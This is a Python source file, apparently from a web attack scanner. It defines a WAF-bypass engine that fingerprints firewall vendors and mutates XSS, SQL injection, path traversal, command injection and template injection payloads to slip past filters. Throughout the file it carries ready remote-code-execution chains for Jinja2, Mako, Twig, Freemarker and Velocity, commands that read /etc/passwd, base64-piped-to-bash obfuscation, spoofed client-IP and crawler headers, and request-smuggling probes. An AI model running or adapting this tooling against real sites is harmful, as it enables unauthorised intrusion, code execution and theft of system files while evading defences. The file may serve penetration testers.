import json
import random
import unicodedata
import time
import base64
import re
import binascii
from urllib.parse import quote
from typing import List, Dict

class WAFBypass:
    """Complete WAF bypass engine — detection, encoding, header manipulation."""

    WAF_SIGNATURES = {
        "cloudflare":      ["cloudflare", "cf-ray", "cf-cache-status", "cf-ipcountry"],
        "cloudfront":      ["x-amz-cf-id", "x-amz-cf-pop", "cloudfront", "x-amz-cf", "awselb/2.0"],
        "akamai":          ["akamai", "x-akamai-", "akamaipnh", "akamai-edge-reference-no"],
        "modsecurity":     ["mod_security", "modsecurity", "NOYB", "OWASP_CRS"],
        "f5_bigip":        ["bigipserver", "f5-traffic-shield", "x-waf-event-info"],
        "imperva":         ["imperva", "incapsula", "x-iinfo", "visid_incap", "incap_ses"],
        "sucuri":          ["sucuri", "x-sucuri-id", "x-sucuri-cache"],
        "barracuda":       ["barracuda", "x-barracuda"],
        "fortinet":        ["fortigate", "fortiweb", "fortiwafsid"],
        "radware":         ["radware", "x-rdwr", "appwall"],
        "comodo":          ["comodo", "cwatch", "x-cwaf"],
        "aws_waf":         ["x-amzn-requestid", "awswaf"],
        "azure_waf":       ["x-ms-request-id", "appgw"],
        "reblaze":         ["reblaze", "rbz"],
        "wallarm":         ["wallarm", "wallarm-node"],
        "citrix_netscaler": ["ns_af", "citrix", "netscaler"],
    }


    @staticmethod
    def detect_waf(headers: Dict, body: str) -> List[str]:
        """Detect WAF from response headers + body signatures with priority to avoid hallucinations."""
        detected = []
        h = {k.lower(): v.lower() for k, v in headers.items()}
        b = body.lower() if body else ""
        
        # Priority 1: Exact Header Matches (Low False Positives)
        if "cf-ray" in h or "cf-cache-status" in h: detected.append("cloudflare")
        if "x-amz-cf-id" in h: detected.append("cloudfront")
        if "x-sucuri-id" in h: detected.append("sucuri")
        if "x-iinfo" in h or "visid_incap" in h.get("set-cookie", ""): detected.append("imperva")
        if "akamai-edge-reference-no" in h or "x-akamai-transformed" in h: detected.append("akamai")
        if "x-ms-request-id" in h: detected.append("azure_waf")
        if "x-amzn-requestid" in h: detected.append("aws_waf")
        if "x-protected-by" in h and "mod_security" in h["x-protected-by"]: detected.append("modsecurity")
        if "set-cookie" in h and re.search(r"\bBIGipServer|F5_ST|TS[a-f0-9]{3,}", h["set-cookie"], re.I):
            detected.append("f5_bigip")
        
        # Priority 2: Server Header Keywords
        server = h.get("server", "")
        if "cloudflare" in server: detected.append("cloudflare")
        if "akamaighost" in server: detected.append("akamai")
        if "sucuri" in server: detected.append("sucuri")
        if "mod_security" in server: detected.append("modsecurity")
        if "barracuda" in server: detected.append("barracuda")
        
        # Priority 3: Signature Database (Only if P1/P2 are thin)
        detected = list(set(detected))  # deduplicate before checking threshold
        if len(detected) < 2:
            for waf_name, sigs in WAFBypass.WAF_SIGNATURES.items():
                # Avoid body scanning for names that might be false positives in text
                if waf_name in ["squid", "varnish", "google_waf"]: continue 
                for s in sigs:
                    if s.lower() in b or s.lower() in json.dumps(h):
                        detected.append(waf_name)
                        break
        
        # Challenge indicators
        if "attention required" in b or "just a moment" in b or "checking your browser" in b:
            if "cloudflare" not in detected: detected.append("cloudflare_challenge")

        return sorted(set(detected))

    @staticmethod
    def encode_xss(payload: str) -> List[str]:
        """9 encoding techniques for XSS WAF bypass."""
        variants = [payload]
        
        # 1. Unicode escape
        v = "".join(f"\\u{ord(c):04x}" if c in "<>'\"/&()=" else c for c in payload)
        variants.append(v)
        
        # 2. Hex entity
        v = "".join(f"&#x{ord(c):x};" if c in "<>'\"/&()=" else c for c in payload)
        variants.append(v)
        
        # 3. Decimal entity
        v = "".join(f"&#{ord(c)};" if c in "<>'\"/&()=" else c for c in payload)
        variants.append(v)
        
        # 4. Double URL
        variants.append(quote(quote(payload, safe=''), safe=''))
        
        # 5. UTF-7
        m = {'<': '+ADw-', '>': '+AD4-', "'": '+ACY-', '"': '+ACI-', '/': '+AC8-'}
        v = "".join(m.get(c, c) for c in payload)
        variants.append(v)
        
        # 6. Null byte
        variants.append(payload.replace("<", "<%00").replace(">", "%00>"))
        variants.append(payload.replace("script", "scr%00ipt"))
        
        # 7. Random case
        v = "".join(c.upper() if c.isalpha() and random.random()>0.5 else c for c in payload)
        variants.append(v)
        
        # 8. Tab/newline injection
        variants.append(payload.replace(" ", "\t").replace("=", "=\n"))
        variants.append(payload.replace(" ", "\r\n"))
        
        # 9. Mixed encoding (stack multiple)
        mixed = base64.b64encode(payload.encode()).decode()
        variants.append(f"eval(atob('{mixed}'))")
        
        return list(set(v for v in variants if v.strip()))

    @staticmethod
    def encode_sqli(payload: str) -> List[str]:
        """11 encoding techniques for SQLi WAF bypass."""
        variants = [payload]
        
        # 1. Comment injection
        subs = {"select":"SEL/**/ECT","union":"UN/**/ION","from":"FR/**/OM",
                "where":"WH/**/ERE","or ":"O/**/R ","and ":"AN/**/D ",
                "order":"OR/**/DER","group":"GR/**/OUP","having":"HA/**/VING",
                "insert":"INS/**/ERT","update":"UP/**/DATE","delete":"DEL/**/ETE",
                "drop":"DR/**/OP","alter":"AL/**/TER","exec":"EX/**/EC",
                "char":"CH/**/AR","concat":"CON/**/CAT","sleep":"SLE/**/EP",
                "benchmark":"BEN/**/CHMARK","pg_sleep":"PG/**/_SLEEP"}
        r = payload
        for pat, rep in subs.items():
            r = re.sub(rf'(?i)\b{pat.strip()}\b', rep, r)
        if r != payload: variants.append(r)
        
        # 2. Nested comment
        v = re.sub(r'/\*\*/', '/***!**/', r) if '/**/' in r else payload
        if v != payload: variants.append(v)
        
        # 3. Case random
        v = "".join(c.upper() if c.isalpha() and random.random()>0.5 else c for c in payload)
        variants.append(v)
        
        # 4. URL + double URL
        variants.append(quote(payload, safe=''))
        variants.append(quote(quote(payload, safe=''), safe=''))
        
        # 5. Hex strings: 'admin' → 0x61646d696e
        for m in re.finditer(r"'([^']+)'", payload):
            q = m.group(1)
            h = "0x" + binascii.hexlify(q.encode()).decode()
            variants.append(payload.replace(f"'{q}'", h))
        
        # 6. Null byte
        variants.append(payload.replace(" ", "%00").replace("'", "%00'").replace("=", "%00="))
        
        # 7. Multiline
        variants.append(payload.replace(" ", "\n").replace("=", "\n=\n"))
        
        # 8. MySQL hint: /*!99999*/
        for kw in ['SELECT','UNION','FROM','WHERE']:
            if kw.lower() in payload.lower():
                variants.append(re.sub(rf'(?i)\b{kw}\b', f'{kw}/*!99999*/', payload, count=1))
        
        # 9. Double keyword: UNION UNION SELECT SELECT
        for kw in ['UNION','SELECT','FROM','WHERE','OR','AND']:
            if kw.lower() in payload.lower():
                variants.append(re.sub(rf'(?i)\b{kw}\b', f'{kw} {kw}', payload))
        
        # 10. Info schema alternatives
        if 'information_schema' in payload.lower():
            variants.append(payload.replace('information_schema','mysql.innodb_table_stats'))
            variants.append(payload.replace('information_schema','performance_schema'))
        
        # 11. CHAR() instead of quotes
        for m in re.finditer(r"'([^']+)'", payload):
            q = m.group(1)
            cv = ",".join(str(ord(c)) for c in q)
            variants.append(payload.replace(f"'{q}'", f"CHAR({cv})"))
        
        return list(set(v for v in variants if v.strip()))

    @staticmethod
    def encode_lfi(payload: str) -> List[str]:
        """12 LFI path traversal bypass techniques."""
        variants = [payload]
        
        # 1-4: Dot-dot variants
        variants.append(payload.replace("../", "....//....//"))
        variants.append(payload.replace("../", "..././..././"))
        variants.append(payload.replace("../", "..//..//..//"))
        variants.append(payload.replace("../", "..\\/..\\/..\\/"))
        
        # 5-7: URL encoding variants
        variants.append(payload.replace("../", "..%252f..%252f..%252f"))
        variants.append(payload.replace("../", "..%c0%ae%c0%ae/"))
        variants.append(payload.replace("../", "..%ef%bc%8f..%ef%bc%8f"))
        
        # 8-9: Null byte truncation
        if '.php' in payload:
            variants.append(payload.replace('.php', '.php%00'))
            variants.append(payload.replace('.php', '.php%2500'))
        
        # 10: Windows backslash
        variants.append(payload.replace("/", "\\"))
        
        # 11: Long path
        if '../' in payload:
            variants.append(payload.replace('../', '../../../../../../../../../'))
        
        # 12: php:// wrapper variants
        if 'php://' in payload:
            variants.append(payload.replace('php://', 'PHP://'))
            variants.append(payload.replace('php://filter/', 
                'php://filter/zlib.deflate/convert.base64-encode/resource='))
        
        return list(set(variants))

    @staticmethod
    def encode_rce(payload: str) -> List[str]:
        """10 RCE/command injection bypass techniques."""
        variants = [payload]
        
        # 1. Case random
        v = "".join(c.upper() if c.isalpha() and random.random()>0.5 else c for c in payload)
        variants.append(v)
        
        # 2. Backtick ↔ $()
        if '`' in payload: variants.append(payload.replace('`', '$('))
        if '$(' in payload: variants.append(payload.replace('$(', '`'))
        
        # 3. Hex encoding for commands
        for cmd in ['cat','whoami','id','ls','echo','curl','wget','bash','sh']:
            if cmd in payload.lower():
                hex_bytes = binascii.hexlify(cmd.encode()).decode()
                hc = "$'" + "".join(f"\\x{hex_bytes[i:i+2]}" for i in range(0, len(hex_bytes), 2)) + "'"
                variants.append(payload.replace(cmd, hc, 1))
        
        # 4. Base64 execution
        for cmd in ['cat','whoami','id','ls']:
            if cmd in payload.lower():
                b = base64.b64encode(cmd.encode()).decode()
                variants.append(payload.replace(cmd, f"echo {b}|base64 -d|bash", 1))
        
        # 5. ${PATH} variable obfuscation
        for cmd in ['cat','whoami','id']:
            if f" {cmd} " in payload.lower():
                vc = f"${{PATH#*:}}/{cmd}"
                variants.append(payload.replace(f" {cmd} ", f" ${{{vc}}} "))
        
        # 6. Wildcard + backslash escaping
        if 'cat ' in payload.lower():
            variants.append(payload.replace('cat ', '/bin/cat '))
            variants.append(payload.replace('cat ', 'c\\at '))
            variants.append(payload.replace('cat ', "c''at "))
        
        # 7. IFS injection
        variants.append(payload.replace(' ', '${IFS}'))
        variants.append(payload.replace(' ', '{,}'))
        
        # 8. Tab substitution
        variants.append(payload.replace(' ', '\t'))
        
        # 9. URL encoding
        variants.append(quote(payload, safe=''))
        
        # 10. Newline continuation
        variants.append(payload.replace(' ', '\\\n'))
        
        return list(set(variants))

    @staticmethod
    def encode_ssti(payload: str) -> List[str]:
        """SSTI WAF bypass — 25+ variants covering Jinja2, Mako, Twig, ERB, Freemarker, Velocity."""
        variants = [payload]

        # Tier 1: Syntax switching (basic)
        if '{{' in payload:
            variants.append(payload.replace('{{', '{%print ').replace('}}', '%}'))
            variants.append(payload.replace('{{', '${').replace('}}', '}'))
            variants.append(payload.replace('{{', '#{').replace('}}', '}'))
            variants.append(payload.replace('{{', '*{').replace('}}', '}'))
            variants.append(payload.replace('{{', '<%= ').replace('}}', ' %>'))
            variants.append(payload.replace('{{', '{# ').replace('}}', ' #}'))  # Twig comment bypass

        # Tier 2: Jinja2/Python exploitation chains
        jinja2_chains = [
            # Config leak
            "{{config}}",
            "{{config.items()}}",
            "{{self.__dict__}}",
            # MRO chain → RCE
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{request.application.__globals__['__builtins__'].__import__('os').popen('id').read()}}",
            # Filter bypass via attr()
            "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}",
            # Hex-escaped builtins
            "{{()|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5fmro\\x5f\\x5f')|list}}",
            # lipsum + cycler gadget chains
            "{{lipsum.__globals__['os'].popen('id').read()}}",
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            "{{joiner.__init__.__globals__.os.popen('id').read()}}",
            "{{namespace.__init__.__globals__.os.popen('id').read()}}",
            # String concat bypass
            "{{''['__cla''ss__']['__mr''o__'][1]['__subcla''sses__']()}}",
            # Index-based RCE (find os._wrap_close or similar)
            "{{''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['os'].popen('id').read()}}",
        ]
        variants.extend(jinja2_chains)

        # Tier 3: Expression filter bypass
        # Dot notation → attr() filter
        if '.' in payload and 'request' in payload.lower():
            import re as _re
            for m in _re.finditer(r'\.([a-zA-Z_]\w*)', payload):
                attr_name = m.group(1)
                variants.append(payload.replace(f'.{attr_name}', f"|attr('{attr_name}')"))

        # Tier 4: Mako template
        mako_chains = [
            "<%\nimport os\nx=os.popen('id').read()\n%>\n${x}",
            "${self.module.cache.util.os.popen('id').read()}",
        ]
        variants.extend(mako_chains)

        # Tier 5: Twig (PHP)
        twig_chains = [
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}",
            "{{['cat /etc/passwd']|filter('system')}}",
        ]
        variants.extend(twig_chains)

        # Tier 6: Freemarker (Java)
        freemarker_chains = [
            "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
            "${'freemarker.template.utility.Execute'?new()('id')}",
            "<#assign objectConstructor='freemarker.template.utility.ObjectConstructor'?new()>${objectConstructor('java.lang.ProcessBuilder','id').start()}",
        ]
        variants.extend(freemarker_chains)

        # Tier 7: Velocity (Java)
        velocity_chains = [
            "#set($e='exp'+'loit')$e",
            "$Runtime.getRuntime().exec('id')",
        ]
        variants.extend(velocity_chains)

        # Tier 8: WAF-specific SSTI evasion
        # Whitespace injection
        if '{{' in payload:
            variants.append(payload.replace('{{', '{ {').replace('}}', '} }'))
            variants.append(payload.replace('{{', '{{\t').replace('}}', '\t}}'))
            variants.append(payload.replace('{{', '{{\n').replace('}}', '\n}}'))
        # Comment-based bypass
        if '{{' in payload:
            variants.append(payload.replace('{{', '{#comment#}{{').replace('}}', '}}{#comment#}'))
        # Base64-encoded payload in Jinja2
        import base64 as _b64
        # Always generate base64-obfuscated RCE variant
        b64_cmd = _b64.b64encode(b'id').decode()
        variants.append(f"{{{{().__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['os'].popen(__import__('base64').b64decode('{b64_cmd}').decode()).read()}}}}")
        b64_cat = _b64.b64encode(b'cat /etc/passwd').decode()
        variants.append(f"{{{{lipsum.__globals__['os'].popen(__import__('base64').b64decode('{b64_cat}').decode()).read()}}}}")

        return list(set(v for v in variants if v.strip()))

    @staticmethod
    def get_bypass_headers() -> Dict[str, str]:
        """Generate WAF-evading request headers."""
        uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
        ]
        
        ips = [
            f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            for _ in range(3)
        ]
        fp = random.choice(ips)
        
        return {
            "User-Agent": random.choice(uas),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache", "Pragma": "no-cache",
            "X-Forwarded-For": fp, "X-Real-IP": fp, "X-Forwarded-Host": fp,
            "X-Client-IP": fp, "Client-IP": fp, "True-Client-IP": fp,
            "Cluster-Client-IP": fp, "X-Originating-IP": fp, "X-Remote-IP": fp,
            "X-Remote-Addr": fp,
            "Forwarded": f"for={fp};proto=https;by={fp}",
            "Via": random.choice(["1.1 google", "1.1 varnish", "1.1 cloudflare"]),
        }

    @staticmethod
    def unicode_normalize(payload: str) -> List[str]:
        """Generate Unicode normalization bypass variants.
        
        Techniques:
        1. Fullwidth characters (U+FF01–U+FF5E)
        2. Homoglyph substitution (Cyrillic/Greek lookalikes)
        3. NFD decomposition
        4. Combining character injection
        5. Invisible characters
        """
        variants = [payload]
        
        # 1. Fullwidth ASCII (U+FF01 maps to '!', U+FF21 maps to 'A', etc.)
        fullwidth_map = {}
        for i in range(0x21, 0x7F):  # ! to ~
            fullwidth_map[chr(i)] = chr(i + 0xFEE0)
        fw = "".join(fullwidth_map.get(c, c) for c in payload)
        if fw != payload:
            variants.append(fw)
        
        # 2. Homoglyph substitution (Latin → Cyrillic/Greek lookalikes)
        homoglyphs = {
            'a': '\u0430', 'c': '\u0441', 'e': '\u0435', 'o': '\u043e',
            'p': '\u0440', 's': '\u0455', 'x': '\u0445', 'y': '\u0443',
            'A': '\u0410', 'B': '\u0412', 'C': '\u0421', 'E': '\u0415',
            'H': '\u041d', 'K': '\u041a', 'M': '\u041c', 'O': '\u041e',
            'P': '\u0420', 'S': '\u0405', 'T': '\u0422', 'X': '\u0425',
        }
        homo = "".join(homoglyphs.get(c, c) if random.random() > 0.5 else c for c in payload)
        if homo != payload:
            variants.append(homo)
        
        # 3. NFD decomposition (é → e + combining accent)
        nfd = unicodedata.normalize('NFD', payload)
        if nfd != payload:
            variants.append(nfd)
        
        # 4. Zero-width character injection
        zwc_chars = ['\u200b', '\u200c', '\u200d', '\ufeff']  # ZWS, ZWNJ, ZWJ, BOM
        zwc = ""
        for c in payload:
            zwc += c
            if c.isalpha() and random.random() > 0.7:
                zwc += random.choice(zwc_chars)
        if zwc != payload:
            variants.append(zwc)
        
        # 5. Combining characters (add combining marks to letters)
        combining = ""
        for c in payload:
            combining += c
            if c.isalpha() and random.random() > 0.8:
                combining += '\u0300'  # Combining grave accent
        if combining != payload:
            variants.append(combining)
        
        # 6. Mixed script: selectively replace some chars
        selective = ""
        for c in payload:
            if c.lower() in homoglyphs and random.random() > 0.6:
                selective += homoglyphs[c.lower()]
            else:
                selective += c
        if selective != payload:
            variants.append(selective)
        
        return list(set(v for v in variants if v.strip()))

    @staticmethod
    def h2_smuggle_check(url: str, policy=None) -> Dict:
        """Conservative request smuggling probe.
        
        This does not prove desync by itself. It only flags repeated timing
        anomalies from ambiguous CL/TE probes compared with a normal baseline.
        """
        from core.network import thttp
        results = {"vulnerable": False, "tests": [], "url": url, "confidence": "none"}
        timeout = 10
        baseline = thttp(url, timeout=timeout, policy=policy)
        baseline_time = baseline.get("time", 0) or 0

        def timing_anomaly(response: Dict) -> bool:
            elapsed = response.get("time", 0) or 0
            return response["status"] > 0 and elapsed >= timeout * 0.85 and baseline_time < timeout * 0.5
        
        # Test 1: CL-TE — send conflicting Content-Length and Transfer-Encoding
        try:
            headers_clte = {
                "Content-Length": "6",
                "Transfer-Encoding": "chunked",
            }
            body_clte = "0\r\n\r\nX"  # CL says 6 bytes, TE says 0 chunk (done)
            samples = [
                thttp(url, method="POST", data=body_clte, headers=headers_clte, timeout=timeout, policy=policy),
                thttp(url, method="POST", data=body_clte, headers=headers_clte, timeout=timeout, policy=policy),
            ]
            
            for r in samples:
                if r["status"] <= 0:
                    continue
                results["tests"].append({
                    "type": "CL-TE",
                    "status": r["status"],
                    "time": r.get("time", 0),
                    "note": "Conflicting CL/TE timing probe; manual desync validation required"
                })
            if len(samples) == 2 and all(timing_anomaly(r) for r in samples):
                results["vulnerable"] = True
                results["confidence"] = "suspected"
        except Exception:
            pass
        
        # Test 2: TE-CL — reversed priority
        try:
            headers_tecl = {
                "Transfer-Encoding": "chunked",
                "Content-Length": "0",
            }
            body_tecl = "5\r\nHELLO\r\n0\r\n\r\n"
            samples = [
                thttp(url, method="POST", data=body_tecl, headers=headers_tecl, timeout=timeout, policy=policy),
                thttp(url, method="POST", data=body_tecl, headers=headers_tecl, timeout=timeout, policy=policy),
            ]
            
            for r in samples:
                if r["status"] <= 0:
                    continue
                results["tests"].append({
                    "type": "TE-CL",
                    "status": r["status"],
                    "time": r.get("time", 0),
                    "note": "TE/CL timing probe; manual desync validation required"
                })
            if len(samples) == 2 and all(timing_anomaly(r) for r in samples):
                results["vulnerable"] = True
                results["confidence"] = "suspected"
        except Exception:
            pass
        
        # Test 3: TE-TE — obfuscated Transfer-Encoding
        # We can only test a subset via our HTTP client
        try:
            headers_tete = {
                "Transfer-Encoding": " chunked",  # Leading space
                "Content-Length": "0",
            }
            samples = [
                thttp(url, method="POST", data="0\r\n\r\n", headers=headers_tete, timeout=timeout, policy=policy),
                thttp(url, method="POST", data="0\r\n\r\n", headers=headers_tete, timeout=timeout, policy=policy),
            ]
            for r in samples:
                if r["status"] <= 0:
                    continue
                results["tests"].append({
                    "type": "TE-TE",
                    "status": r["status"],
                    "time": r.get("time", 0),
                    "note": "Obfuscated TE timing probe; manual desync validation required"
                })
            if len(samples) == 2 and all(timing_anomaly(r) for r in samples):
                results["vulnerable"] = True
                results["confidence"] = "suspected"
        except Exception:
            pass
        
        return results

class RateLimiter:
    """Adaptive rate limiter to avoid WAF blocking."""
    def __init__(self, base: float = 1.0):
        self.base = base
        self.last = 0
        self.count = 0
        self.errors = 0
    
    def wait(self):
        if self.base == 0: return
        now = time.time()
        d = self.base * (1 + self.errors * 0.5) * (1 + self.count / 20 * 0.3)
        d = min(d, 5.0) # Cap at 5 seconds max
        if now - self.last < d:
            time.sleep(d - (now - self.last))
        self.last = time.time()
        self.count += 1
    
